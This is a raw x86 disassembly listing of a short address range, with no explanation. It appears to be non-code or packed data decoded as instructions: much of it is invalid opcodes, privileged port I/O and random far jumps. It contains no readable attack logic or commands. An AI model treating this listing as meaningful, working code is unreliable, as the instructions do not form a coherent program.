  4040e2:	(bad)  
  4040e3:	dec    edx
  4040e4:	es cs loope 0x4040cd
  4040e8:	mov    bh,0x48
  4040ea:	sbb    DWORD PTR [ebx],esi
  4040ec:	sbb    eax,DWORD PTR [edx]
  4040ee:	pusha  
  4040ef:	xchg   edi,eax
  4040f0:	jmp    0x55a1f70d
  4040f5:	and    al,0xa0
  4040f7:	mov    dh,0xcb
  4040f9:	stos   DWORD PTR es:[edi],eax
  4040fa:	add    DWORD PTR [esi],ebp
  4040fc:	jg     0x40417a
  4040fe:	les    esi,FWORD PTR [esi+0x110f6cf9]
  404104:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  404106:	fsub   DWORD PTR [esi+0x4c]
  404109:	cmp    ch,BYTE PTR [edx-0x25]
  40410c:	loopne 0x404152
  40410e:	test   eax,0xc4e26913
  404113:	or     al,0xd5
  404115:	les    edi,FWORD PTR [esi+0x2aa8f869]
  40411b:	popf   
  40411c:	jns    0x4040bf
  40411e:	les    esp,FWORD PTR [ebx+0x77798674]
  404124:	popf   
  404125:	pop    edx
  404126:	(bad)  
  404127:	jmp    0x1d86:0x8f5b00af
  40412e:	fiadd  WORD PTR ds:0x460feaff
  404134:	int3   
  404135:	push   0x2f
  404137:	and    eax,0xbf38fa40
  40413c:	js     0x404151
  40413e:	sar    ebx,cl
  404140:	xchg   esi,eax
  404141:	add    al,0xd0
  404143:	cmp    eax,0x3cb2bcec
  404148:	xor    bh,BYTE PTR es:[esi]
  40414b:	data16 aaa 
  40414d:	pop    edi
  40414e:	sub    DWORD PTR [edx],edi
  404150:	mov    al,0x4b
  404152:	push   0xa7cde495
  404157:	push   edi
  404158:	gs add al,0x56
  40415b:	rol    BYTE PTR [edx],cl
  40415d:	enter  0xcf55,0x2f
  404161:	ret    
  404162:	mov    BYTE PTR [ebx-0xa],bh
  404165:	jmp    0x3bbf:0xbcfd9175
  40416c:	daa    
  40416d:	cmp    ecx,edx
  40416f:	shl    DWORD PTR [ebx+eax*8-0x13b1ca93],cl
  404176:	(bad)  
  404177:	shl    BYTE PTR [ecx+0x4c],cl
  40417a:	jnp    0x40414a
  40417c:	mov    cl,0x99
  40417e:	cmp    DWORD PTR [ebx],eax
  404180:	nop
  404181:	fs in  al,0xb
  404184:	mov    al,0x6
  404186:	mov    ecx,0x876e3d14
  40418b:	pop    eax
  40418c:	daa    
  40418d:	in     al,dx
  40418e:	adc    DWORD PTR [ecx+0x7c],edi
  404191:	inc    al
  404193:	bound  esi,QWORD PTR [ecx]
  404195:	xor    ah,BYTE PTR [eax-0x39]
  404198:	jne    0x34e92f35
  40419e:	stos   DWORD PTR es:[edi],eax
  40419f:	retf   0xfa7a
  4041a2:	cs jnp 0x4041a5
  4041a5:	out    0x1f,al
  4041a7:	loop   0x4041e3
  4041a9:	add    cl,BYTE PTR [edi+0x37]
  4041ac:	or     ebx,DWORD PTR [eax]
  4041ae:	xor    eax,0x30f904d1
  4041b3:	lock test ebp,edi
  4041b6:	cmp    al,0xa6
  4041b8:	xor    esi,ebx
  4041ba:	scas   eax,DWORD PTR es:[edi]
  4041bb:	(bad)  [edi-0x35218390]
  4041c1:	call   0x4c66:0x7bb2226c
  4041c8:	fcmovne st,st(4)
  4041ca:	ret    0x17e7
  4041cd:	mov    ebp,0x3484f092
  4041d2:	or     eax,0x89d3e031
  4041d7:	sbb    al,dl
  4041d9:	xchg   ecx,edx
  4041db:	inc    edx
  4041dc:	and    eax,0xcda32424
  4041e1:	neg    al
  4041e3:	mov    dh,0xa1
  4041e5:	adc    eax,0x3cb829b3
  4041ea:	test   al,0x17
  4041ec:	mov    esi,0x779cf9a3
  4041f1:	push   esp
  4041f2:	and    al,al
  4041f4:	dec    eax
  4041f5:	test   eax,0x29a7526f
  4041fa:	shr    bl,0x5b
  4041fd:	les    ebp,FWORD PTR [esi-0x369d8e8f]
  404203:	mov    esp,0x81c71d74
  404208:	fsub   DWORD PTR [edi+eax*1+0x74]
  40420c:	sbb    al,0xab
  40420e:	jmp    DWORD PTR [edx+0x3d]
  404211:	aaa    
  404212:	nop
  404213:	pop    ebp
  404214:	int3   
  404215:	mov    edi,0x3046f27c
  40421a:	mov    DWORD PTR [esi-0x70e92d86],ebp
  404220:	pop    ecx
  404221:	pushf  
  404222:	in     al,0xea
  404224:	data16 mov cl,BYTE PTR [esi+0x60]
  404228:	pop    esp
  404229:	sbb    eax,0xcfe9f57a
  40422e:	mov    BYTE PTR [ebx+0x1e2c20af],al
  404234:	mov    ecx,ds
  404236:	popf   
  404237:	jno    0x40428b
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	bswap  eax
  404259:	push   edi
  40425a:	jne    0x40421e
  40425c:	dec    edi
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0x170707d
  404265:	adc    BYTE PTR [edi+eax*2],0x9c
  404269:	icebp  
  40426a:	add    eax,0xf40c9f1c
  40426f:	sbb    al,0x7f
  404271:	xchg   ebp,eax
  404272:	dec    edi
  404273:	add    ch,BYTE PTR ds:0xb67da50a
  404279:	xchg   ecx,eax
  40427a:	sar    DWORD PTR [ecx+0x5b1cb912],1
  404280:	jmp    0x4e4:0x323e6793
  404287:	jns    0x404217
  404289:	cmc    
  40428a:	jp     0x404216
  40428c:	ficom  DWORD PTR [ecx-0x66d93c85]
  404292:	scas   al,BYTE PTR es:[edi]
  404293:	xor    al,0x58
  404295:	and    al,0xa8
  404297:	ror    dl,cl
  404299:	mov    ah,0x7d
  40429b:	mov    ah,0x22
  40429d:	sti    
  40429e:	int    0x9
  4042a0:	push   cs
  4042a1:	pop    ds
  4042a2:	push   edx
  4042a3:	pop    eax
  4042a4:	ret    0x3564
  4042a7:	inc    esp
  4042a8:	dec    eax
  4042a9:	mov    DWORD PTR [esp+edi*2],edi
  4042ac:	mov    dh,0xb8
  4042ae:	pop    es
  4042af:	mov    ah,0xce
  4042b1:	je     0x404317
  4042b3:	daa    
  4042b4:	mov    edi,0xa1a5f094
  4042b9:	mov    al,ds:0x60479004
  4042be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042bf:	les    edx,FWORD PTR [ebx]
  4042c1:	mov    ch,0x11
  4042c3:	jmp    0xff77969b
  4042c8:	inc    ecx
  4042c9:	sahf   
  4042ca:	inc    ebx
  4042cb:	lahf   
  4042cc:	cmp    bh,ah
  4042ce:	(bad)  
  4042cf:	(bad)  
  4042d1:	ins    DWORD PTR es:[edi],dx
  4042d2:	divps  xmm5,XMMWORD PTR [edx]
  4042d5:	(bad)  
  4042d6:	outs   dx,DWORD PTR ds:[esi]
  4042d7:	rcl    DWORD PTR [ecx+0xa],0xda
  4042db:	or     DWORD PTR [esp+eiz*4+0x46],edx
  4042df:	xchg   edx,eax
  4042e0:	add    ebx,DWORD PTR [eax-0x2d]
  4042e3:	cmc    
  4042e4:	hlt    
  4042e5:	mov    edi,edi
  4042e7:	lahf   
  4042e8:	stos   DWORD PTR es:[edi],eax
  4042e9:	out    0x8b,al
  4042eb:	dec    eax
  4042ec:	dec    ebp
  4042ed:	add    ebx,esi
  4042ef:	into   
  4042f0:	cmp    ah,BYTE PTR [esi]
  4042f2:	dec    esp
  4042f3:	imul   ecx,DWORD PTR ds:0xe6c854c8,0x7a
  4042fa:	xchg   esi,eax
  4042fb:	xchg   ecx,eax
  4042fc:	into   
  4042fd:	fsubr  QWORD PTR [ebp+0x73]
  404300:	pushw  ss
  404302:	enter  0x92bd,0x17
  404306:	mov    al,ds:0xc5569c30
  40430b:	fld    TBYTE PTR [ebx]
  40430d:	pop    ebx
  40430e:	das    
  40430f:	arpl   WORD PTR [ebp+0x4355a9ae],si
  404315:	mov    ch,0x9b
  404317:	push   es
  404318:	adc    BYTE PTR [ecx+0x5068cd78],0x4
  40431f:	lods   eax,DWORD PTR ds:[esi]
  404320:	jge    0x404371
  404322:	inc    ebp
  404323:	xchg   esi,eax
  404324:	push   eax
  404325:	nop
  404326:	pop    ss
  404327:	jmp    0xa45e:0x22fad321
  40432e:	or     al,0x3b
  404330:	ret    0xe479
  404333:	push   eax
  404334:	nop
  404335:	iret   
  404336:	ins    DWORD PTR es:[edi],dx
  404337:	xchg   esi,eax
  404338:	jmp    0x404335
  40433a:	shl    DWORD PTR [ecx+edi*2],1
  40433d:	test   BYTE PTR [ebx+0xb],ah
  404340:	stc    
  404341:	scas   eax,DWORD PTR es:[edi]
  404342:	jmp    0x404326
  404344:	pop    ds
  404345:	int    0x28
  404347:	xchg   ecx,eax
  404348:	cmp    DWORD PTR [ebp+0x2420161a],ebp
  40434e:	jmp    0x4043a0
  404350:	gs and al,dh
  404353:	fcmovnb st,st(6)
  404355:	cmp    ch,cl
  404357:	or     dh,BYTE PTR [eax+0x24f99e0d]
  40435d:	ins    BYTE PTR es:[edi],dx
  40435e:	adc    ah,BYTE PTR [esi]
  404360:	xor    esp,0x4a
  404363:	pusha  
  404364:	imul   edx,esp,0xffffffdc
  404367:	pop    edx
  404368:	push   ss
  404369:	sbb    edx,DWORD PTR [eax]
  40436b:	(bad)  
  40436c:	mov    esp,DWORD PTR [edi]
  40436e:	es je  0x404350
  404371:	sbb    esi,DWORD PTR [edx+0x78]
  404374:	ins    BYTE PTR es:[edi],dx
  404375:	push   0x7
  404377:	mov    dh,0xd4
  404379:	fdivr  DWORD PTR [eax-0x47]
  40437c:	mov    esi,0xc2f264f2
  404381:	pop    edx
  404382:	mov    edi,DWORD PTR [ecx+0x64f1f045]
  404388:	pop    esp
  404389:	inc    eax
  40438a:	ror    BYTE PTR [edx-0x77c9c53a],0xf
  404391:	sbb    esi,DWORD PTR [eax]
  404393:	in     eax,dx
  404394:	test   al,0x78
  404396:	ficom  WORD PTR [eax+edi*8+0x16]
  40439a:	mov    esi,0x5c940a99
  40439f:	rol    DWORD PTR [esi+0x5c27688e],cl
  4043a5:	push   DWORD PTR [ebx-0x1e]
  4043a8:	daa    
  4043a9:	add    eax,DWORD PTR [eax+0x7953a335]
  4043af:	cdq    
  4043b0:	mov    cl,0x8e
  4043b2:	mov    ecx,0xd9ac34b3
  4043b7:	outs   dx,DWORD PTR ds:[esi]
  4043b8:	mov    esi,0xa8a9ae87
  4043bd:	in     al,dx
  4043be:	jb     0x40435f
  4043c0:	sbb    BYTE PTR [esi+0x150866ee],bh
  4043c6:	and    DWORD PTR ds:0x14bafc1c,ecx
  4043cc:	and    eax,0xafd91f75
  4043d1:	cwde   
  4043d2:	int3   
  4043d3:	cmp    DWORD PTR [edi+eiz*2],ecx
  4043d6:	sub    ebp,DWORD PTR [eax+edi*2+0x75e700e]
  4043dd:	dec    ebx
  4043de:	pop    ebx
  4043df:	(bad)  
  4043e1:	scas   al,BYTE PTR es:[edi]
  4043e2:	pushf  
  4043e3:	adc    DWORD PTR [ecx-0x6e87066a],esi
  4043e9:	xor    BYTE PTR [edi],0x3
  4043ec:	add    eax,0x7503b05c
  4043f1:	xchg   edi,eax
  4043f2:	nop
  4043f3:	xchg   esp,eax
  4043f4:	mov    ecx,0xa277abd7
  4043f9:	cmp    DWORD PTR [ebp+0xe],edi
  4043fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043fd:	cmp    DWORD PTR [ecx+0x78],ebx
  404400:	xchg   edi,eax
  404401:	sbb    bl,BYTE PTR [esi+ebx*8]
  404404:	in     eax,dx
  404405:	xchg   BYTE PTR [ebx-0x204c91f9],ah
  40440b:	jb     0x4043c0
  40440d:	cs mov ebx,0x45ae5857
  404413:	mov    al,ds:0x59f68631
  404418:	dec    BYTE PTR [esi-0x3a]
  40441b:	out    0xee,al
  40441d:	fcmovnu st,st(2)
  40441f:	jp     0x404443
  404421:	adc    ah,0x5e
  404424:	loop   0x4043ff
  404426:	xlat   BYTE PTR ds:[ebx]
  404427:	cmp    DWORD PTR [esi],ebp
  404429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40442a:	mov    eax,ds:0x587b1fd0
  40442f:	push   ecx
  404430:	outs   dx,BYTE PTR ds:[esi]
  404431:	add    bh,BYTE PTR [edi+0x77316d23]
  404437:	sub    DWORD PTR [edx-0x1a0cc8bc],edx
  40443d:	daa    
  40443e:	mov    ecx,0x884601ea
  404443:	mov    esp,0xa7649a4d
  404448:	out    dx,al
  404449:	mov    DWORD PTR ds:0x451e9257,eax
  40444f:	ror    DWORD PTR [ebx],cl
  404451:	mov    BYTE PTR [edi+0x35defa70],bh
  404457:	ins    BYTE PTR es:[edi],dx
  404458:	mov    ds:0x7346985f,eax
  40445d:	into   
  40445e:	jmp    0xa844:0x5ee11958
  404465:	dec    esp
  404466:	aaa    
  404467:	xor    DWORD PTR [esi],eax
  404469:	push   0xc7ae6a9c
  40446e:	fisubr DWORD PTR [eax+0x61430803]
  404474:	hlt    
  404475:	sbb    al,0xc2
  404477:	test   eax,0x40d400e
  40447c:	stos   BYTE PTR es:[edi],al
  40447d:	call   0x342221f8
  404482:	mov    DWORD PTR [ecx],0x266b6672
  404488:	addr16 pop edi
  40448a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40448b:	xor    BYTE PTR [edi],al
  40448d:	cdq    
  40448e:	lock scas al,BYTE PTR es:[edi]
  404490:	dec    esp
  404491:	repnz dec ebp
  404493:	loop   0x404415
  404495:	adc    esi,DWORD PTR [eax+0x4d8bed8]
  40449b:	push   eax
  40449c:	aaa    
  40449d:	sahf   
  40449e:	adc    BYTE PTR [eax],bl
  4044a0:	or     BYTE PTR [edi+0x6e],dl
  4044a3:	adc    edi,ecx
  4044a5:	and    al,0xf4
  4044a7:	push   0x58
  4044a9:	mov    edi,0xaa521be8
  4044ae:	imul   edi,DWORD PTR [edi+esi*8+0x1e],0xc681f3e9
  4044b6:	add    ebp,DWORD PTR [ebp+0x6a3608d7]
  4044bc:	pop    esp
  4044bd:	cld    
  4044be:	jecxz  0x404518
  4044c0:	xchg   esi,eax
  4044c1:	mov    eax,0x1c118ce
  4044c6:	dec    ecx
  4044c7:	addr16 fwait
  4044c9:	icebp  
  4044ca:	jmp    0x64c:0xe3e33a7b
  4044d1:	outs   dx,BYTE PTR ds:[esi]
  4044d2:	arpl   WORD PTR [ecx-0x79a7ec85],ax
  4044d8:	mov    ebp,0xc70a5ad0
  4044dd:	push   edi
  4044de:	out    dx,al
  4044df:	lds    esi,FWORD PTR [ebx]
  4044e1:	mov    bh,0x44
  4044e3:	enter  0x5e9f,0xf8
  4044e7:	popf   
  4044e8:	in     al,dx
  4044e9:	push   esi
  4044ea:	fsubr  QWORD PTR [esp+ebp*4]
  4044ed:	pop    ebp
  4044ee:	dec    esp
  4044ef:	jne    0x4044fd
  4044f1:	xchg   esi,eax
  4044f2:	adc    DWORD PTR [edi+0xad3297d],ecx
  4044f8:	rcr    BYTE PTR [edx-0x24],1
  4044fb:	or     esp,DWORD PTR [edi-0x7d5b6cde]
  404501:	mov    ah,0xd5
  404503:	mov    dl,ah
  404505:	jns    0x404538
  404507:	xor    edi,DWORD PTR [edx]
  404509:	(bad)
  40450d:	push   ecx
  40450e:	push   edx
  40450f:	mov    esi,0xcd53cfc8
  404514:	pop    edi
  404515:	fld    st(3)
  404517:	push   ds
  404518:	and    eax,DWORD PTR [ebx-0x14]
  40451b:	add    dh,BYTE PTR [esi]
  40451d:	(bad)  
  40451f:	dec    eax
  404520:	push   edi
  404521:	or     ch,BYTE PTR ds:0xf6c3c5c5
  404527:	xchg   DWORD PTR [ebp+0x16a5bfbc],ecx
  40452d:	and    esp,DWORD PTR [ebp-0x18]
  404530:	ret    0x9a5
  404533:	xor    edx,edi
  404535:	jl     0x404515
  404537:	mov    BYTE PTR [esi],dl
  404539:	and    DWORD PTR [esp+edi*8-0x38],ecx
  40453d:	cmp    BYTE PTR [edx+0x5a5f2296],dl
  404543:	adc    al,0xda
  404545:	add    ebp,ebx
  404547:	add    BYTE PTR [ebx],ah
  404549:	push   edi
  40454a:	mov    bl,0x4e
  40454c:	inc    ecx
  40454d:	ins    DWORD PTR es:[edi],dx
  40454e:	and    edx,DWORD PTR [eax]
  404550:	pop    esi
  404551:	jns    0x404551
  404553:	jb     0x40459a
  404555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404556:	cmp    al,0x8a
  404558:	lods   eax,DWORD PTR ds:[esi]
  404559:	icebp  
  40455a:	xor    esi,DWORD PTR [ebp-0x4]
  40455d:	dec    esp
  40455e:	xor    DWORD PTR [edx-0x68],edx
  404561:	mov    dl,0x5c
  404563:	lds    esp,FWORD PTR [edx+0x31]
  404566:	xor    eax,0x3b626883
  40456b:	mov    ch,0xf2
  40456d:	jmp    0x3e50299e
  404572:	arpl   WORD PTR [ecx],bx
  404574:	xor    DWORD PTR [edx-0x642798f6],esp
  40457a:	sub    BYTE PTR [ecx-0xe],dh
  40457d:	pop    eax
  40457e:	ins    BYTE PTR es:[edi],dx
  40457f:	xchg   esp,eax
  404580:	pop    ebx
  404581:	sbb    dl,BYTE PTR [edx]
  404583:	fimul  DWORD PTR [eax+0x37]
  404586:	xchg   ebx,eax
  404587:	inc    esp
  404588:	aaa    
  404589:	(bad)  
  40458b:	lods   al,BYTE PTR ds:[esi]
  40458c:	adc    ebx,ebx
  40458e:	sbb    eax,0xc70c95db
  404593:	loopne 0x40451c
  404595:	das    
  404596:	jnp    0x4045d1
  404598:	int3   
  404599:	pushf  
  40459a:	cmp    BYTE PTR [eax],ah
  40459c:	ja     0x4045fc
  40459e:	push   esi
  40459f:	clc    
  4045a0:	dec    esp
  4045a1:	mov    BYTE PTR [esi-0x4e6893bb],ah
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fd82,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	sar    DWORD PTR [ecx],1
  4045c9:	sti    
  4045ca:	(bad)  [esp]
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xdf70707d
  4045d4:	pop    esp
  4045d5:	sbb    ah,BYTE PTR [esi+0x27]
  4045d8:	push   0x55
  4045da:	jno    0x404588
  4045dc:	cmp    eax,0x31fd00bf
  4045e1:	jb     0x4045ae
  4045e3:	mov    ds:0xd8bcc636,eax
  4045e8:	fucomip st,st(2)
  4045ea:	enter  0xaecf,0xb2
  4045ee:	dec    eax
  4045ef:	hlt    
  4045f0:	loope  0x404632
  4045f2:	test   al,0xd4
  4045f4:	arpl   WORD PTR [esi],dx
  4045f6:	fdiv   DWORD PTR [ebx]
  4045f8:	xchg   ebp,eax
  4045f9:	jbe    0x4045e3
  4045fb:	xchg   ebx,eax
  4045fc:	and    DWORD PTR [ecx+0x54],edi
  4045ff:	out    0x34,al
  404601:	(bad)  
  404602:	repz popf 
  404604:	stos   DWORD PTR es:[edi],eax
  404605:	fcomp  QWORD PTR es:[esi+0x3b134481]
  40460c:	les    esi,FWORD PTR [ebx-0x28]
  40460f:	mov    al,0xd2
  404611:	shr    DWORD PTR [esi+0x6],0x4b
  404615:	jmp    0xc71c:0x708bf24
  40461c:	mov    BYTE PTR [ebx],cl
  40461e:	and    ch,BYTE PTR [eax]
  404620:	(bad)  
  404621:	mov    eax,0x930d35d0
  404626:	jecxz  0x404638
  404628:	ds out 0x71,al
  40462b:	leave  
  40462c:	jnp    0x404644
  40462e:	jo     0x404630
  404630:	shl    DWORD PTR [ebp+0x1f],1
  404633:	jnp    0x4045cd
  404635:	add    BYTE PTR [eax+0x73216d38],bh
  40463b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40463c:	jae    0x40462a
  40463e:	add    DWORD PTR [esi+0x1d],esi
  404641:	(bad)  
  404642:	aam    0x74
  404644:	leave  
  404645:	ja     0x4046a4
  404647:	aam    0x1b
  404649:	lahf   
  40464a:	lock cdq 
  40464c:	xrelease mov DWORD PTR [edi+0x4d90f6dc],0x8d07c17d
  404657:	pop    ecx
  404658:	daa    
  404659:	setb   BYTE PTR [ebp-0x33]
  40465d:	inc    si
  40465f:	and    BYTE PTR [edx+0x5c8b5e66],ch
  404665:	inc    ecx
  404666:	rol    esi,0x87
  404669:	adc    BYTE PTR [eax],dl
  40466b:	pusha  
  40466c:	pop    ebx
  40466d:	xor    bl,BYTE PTR [ecx+0x26ce6951]
  404673:	js     0x4045f7
  404675:	fnstenv [edi-0x6dc0fb98]
  40467b:	mov    ah,0x57
  40467d:	pop    esp
  40467e:	stos   BYTE PTR es:[edi],al
  40467f:	retf   0x1a4b
  404682:	nop
  404683:	or     bh,BYTE PTR [ebx+0x74cc6a2e]
  404689:	push   0x50
  40468b:	(bad)  
  40468c:	xor    edi,DWORD PTR fs:[ecx+0x67d8876f]
  404693:	outs   dx,DWORD PTR ds:[esi]
  404694:	out    0x90,al
  404696:	repnz pop edx
  404698:	into   
  404699:	cld    
  40469a:	cld    
  40469b:	data16 jle 0x404638
  40469e:	call   0xfdf3:0x789ffda2
  4046a5:	pusha  
  4046a6:	sub    eax,0xfb5d9fe1
  4046ab:	push   0x75
  4046ad:	jecxz  0x4046d3
  4046af:	push   0xb9c8acb1
  4046b4:	push   esp
  4046b5:	cmp    al,0x7a
  4046b7:	pusha  
  4046b8:	and    edx,DWORD PTR [edx]
  4046ba:	mov    al,ds:0x6f8b8175
  4046bf:	stos   BYTE PTR es:[edi],al
  4046c0:	mov    ecx,0xadc83351
  4046c5:	fstp   DWORD PTR [ecx]
  4046c7:	push   ds
  4046c8:	pop    ecx
  4046c9:	or     al,0xdc
  4046cb:	in     eax,dx
  4046cc:	jmp    0xf7efd3d3
  4046d1:	outs   dx,BYTE PTR ds:[esi]
  4046d2:	dec    ebp
  4046d3:	in     eax,dx
  4046d4:	mov    ds:0x7af5820a,al
  4046d9:	mov    dl,0xb1
  4046db:	shl    BYTE PTR [ecx-0x61088773],1
  4046e1:	push   esi
  4046e2:	mov    fs:0x3c70ba4a,eax
  4046e8:	inc    edi
  4046e9:	cwde   
  4046ea:	aaa    
  4046eb:	jp     0x404752
  4046ed:	cld    
  4046ee:	or     al,0x4
  4046f0:	and    eax,0xf4a22bf6
  4046f5:	fiadd  DWORD PTR [ebp+0x62e45b1b]
  4046fb:	or     DWORD PTR [ebp+0x63],0xf9653224
  404702:	ds in  al,0xdc
  404705:	push   ecx
  404706:	add    DWORD PTR [eax+eiz*1+0x29973297],eax
  40470d:	scas   eax,DWORD PTR es:[edi]
  40470e:	inc    ebp
  40470f:	aam    0x19
  404711:	dec    eax
  404712:	sub    al,0x66
  404714:	js     0x404771
  404716:	or     esp,edi
  404718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404719:	cld    
  40471a:	mov    dh,dl
  40471c:	(bad)  
  40471d:	mov    ah,0x1e
  40471f:	jne    0x40471f
  404721:	lds    edx,FWORD PTR [eax]
  404723:	push   es
  404724:	lock mov bh,0x2b
  404727:	out    0x98,al
  404729:	add    al,0xa0
  40472b:	jmp    0x40473c
  40472d:	arpl   WORD PTR [edx-0x52],dx
  404730:	jae    0x4046bb
  404732:	shl    DWORD PTR [edi+edx*8],1
  404735:	jne    0x4046c0
  404737:	je     0x40471e
  404739:	or     bl,BYTE PTR [ebx]
  40473b:	push   0xb72eb182
  404740:	call   FWORD PTR [esi+0x3]
  404743:	repz xor bh,0xe8
  404747:	sub    DWORD PTR [ebx+0x6],ebp
  40474a:	fisub  DWORD PTR [esi]
  40474c:	aad    0x8
  40474e:	jg     0x4047af
  404750:	mov    ebp,0x82458932
  404755:	mul    DWORD PTR [edx+0x1]
  404758:	test   eax,0x4add00cb
  40475d:	scas   al,BYTE PTR es:[edi]
  40475e:	push   eax
  40475f:	and    al,0x77
  404761:	(bad)  [edi-0x647f2372]
  404767:	xchg   bl,bh
  404769:	inc    ebx
  40476a:	adc    BYTE PTR [eax*4+0x58b5502f],bh
  404771:	or     ch,BYTE PTR [edi+0x25f394fb]
  404777:	mov    bh,0x11
  404779:	idiv   BYTE PTR [esi+eiz*4]
  40477c:	inc    esi
  40477d:	scas   al,BYTE PTR es:[edi]
  40477e:	fwait
  40477f:	add    ebx,DWORD PTR [edx+0x5e]
  404782:	scas   al,BYTE PTR es:[edi]
  404783:	mov    ebx,0xbd755b9f
  404788:	mov    eax,ds:0x1639fd87
  40478d:	(bad)  
  40478f:	stc    
  404790:	movhlps xmm6,xmm3
  404793:	jbe    0x4047d9
  404795:	sub    eax,0x3e506d16
  40479a:	addr16 aaa 
  40479c:	out    0x8d,al
  40479e:	enter  0x18f2,0xf7
  4047a2:	ja     0x4047e4
  4047a4:	fmul   DWORD PTR [ebx+ebx*1+0x5df0ecb5]
  4047ab:	jp     0x4047a2
  4047ad:	jp     0x40479a
  4047af:	fld    DWORD PTR [ecx-0x75]
  4047b2:	cli    
  4047b3:	out    dx,al
  4047b4:	cmp    eax,0x5816d530
  4047b9:	inc    ebp
  4047ba:	les    eax,FWORD PTR ds:0xc5c92fb0
  4047c0:	adc    bl,bh
  4047c2:	(bad)  
  4047c3:	mov    dl,0x19
  4047c5:	lahf   
  4047c6:	in     al,0xae
  4047c8:	push   ebx
  4047c9:	mov    al,0x5b
  4047cb:	adc    BYTE PTR [ecx+ebp*4],0xa
  4047cf:	push   esp
  4047d0:	inc    esp
  4047d1:	scas   eax,DWORD PTR es:[edi]
  4047d2:	mov    ch,0xce
  4047d4:	jae    0x404841
  4047d6:	into   
  4047d7:	mov    fs,ebx
  4047d9:	push   ecx
  4047da:	dec    ecx
  4047db:	cwde   
  4047dc:	jmp    0x404853
  4047de:	mov    dh,bh
  4047e0:	pop    eax
  4047e1:	mov    ecx,DWORD PTR [edx]
  4047e3:	pop    ss
  4047e4:	addr16 es cs cld 
  4047e8:	iretw  
  4047ea:	add    DWORD PTR [eax+0x19817994],0x9d4bd9cd
  4047f4:	push   ds
  4047f5:	int3   
  4047f6:	retf   0x23f
  4047f9:	out    dx,eax
  4047fa:	lahf   
  4047fb:	sbb    bh,bh
  4047fd:	dec    edi
  4047fe:	cmp    al,0xc4
  404800:	and    al,0x46
  404802:	sbb    al,BYTE PTR [ebx-0x74]
  404805:	adc    BYTE PTR [ebx-0x4965bda8],cl
  40480b:	shl    DWORD PTR [edx+0x5b5cd129],0xb0
  404812:	enter  0x2c9e,0x43
  404816:	ror    DWORD PTR [esi+0x4b],0x9c
  40481a:	mov    dh,0x5a
  40481c:	push   0x91c9bd33
  404821:	sti    
  404822:	sub    eax,0xf6bf5e30
  404827:	mov    cl,0x5f
  404829:	mov    esp,0x1da3558b
  40482e:	out    0xee,eax
  404830:	(bad)  
  404831:	(bad)  [edi-0x7b]
  404834:	(bad)  
  404835:	cli    
  404836:	pop    es
  404837:	neg    DWORD PTR [ebp+0x2f]
  40483a:	pop    ds
  40483b:	xor    esp,DWORD PTR ds:0xc991ba86
  404841:	retf   
  404842:	mov    bh,0xc1
  404844:	aam    0xa3
  404846:	data16 or al,0xf8
  404849:	xor    DWORD PTR [edx+0x25],edx
  40484c:	push   cs
  40484d:	mov    DWORD PTR [esi],ebp
  40484f:	in     eax,dx
  404850:	arpl   WORD PTR [eax+0x12],dx
  404853:	dec    esp
  404854:	and    ecx,DWORD PTR ds:0x53530c
  40485a:	out    dx,eax
  40485b:	test   DWORD PTR [eax+0x3f9332fc],ebx
  404861:	ja     0x40481b
  404863:	retf   0x674b
  404866:	cmp    BYTE PTR [ebx],al
  404868:	clc    
  404869:	sub    al,0x7e
  40486b:	sbb    BYTE PTR [ebx],bh
  40486d:	(bad)  
  40486e:	jmp    0x4047f3
  404870:	cwde   
  404871:	div    DWORD PTR [edi]
  404873:	ret    0xe3e1
  404876:	pop    ss
  404877:	stos   BYTE PTR es:[edi],al
  404878:	cmp    DWORD PTR [edi-0x430af1f],ebx
  40487e:	ret    0x1fa
  404881:	fld    QWORD PTR [eax-0x3d55dbc2]
  404887:	jle    0x4048bb
  404889:	push   ebp
  40488a:	ins    BYTE PTR es:[edi],dx
  40488b:	xchg   ecx,eax
  40488c:	mov    eax,DWORD PTR [edx]
  40488e:	cmp    cl,BYTE PTR [ebx-0x198c5bfc]
  404894:	je     0x404853
  404896:	das    
  404897:	push   DWORD PTR [ecx-0x13]
  40489a:	je     0x404838
  40489c:	pushf  
  40489d:	push   ebx
  40489e:	cmp    esp,DWORD PTR [ebp+0x6350fa16]
  4048a4:	pop    ebp
  4048a5:	nop
  4048a6:	fmul   DWORD PTR [eax]
  4048a8:	stos   DWORD PTR es:[edi],eax
  4048a9:	hlt    
  4048aa:	vpsubsb ymm3,ymm3,ymm1
  4048ae:	push   0x67b4b841
  4048b3:	dec    eax
  4048b4:	lods   eax,DWORD PTR ds:[esi]
  4048b5:	push   cs
  4048b6:	mov    ch,0xc1
  4048b8:	les    edx,FWORD PTR [ebx+edx*2]
  4048bb:	cmp    BYTE PTR [edi+0x25],bh
  4048be:	pop    ebp
  4048bf:	sbb    dh,BYTE PTR [edi]
  4048c1:	shl    dl,cl
  4048c3:	mov    BYTE PTR [eax-0x28],bl
  4048c6:	ret    
  4048c7:	and    bh,BYTE PTR [esi+ebx*4]
  4048ca:	cmp    eax,ecx
  4048cc:	outs   dx,DWORD PTR ds:[esi]
  4048cd:	mov    edi,0x4fb30b2b
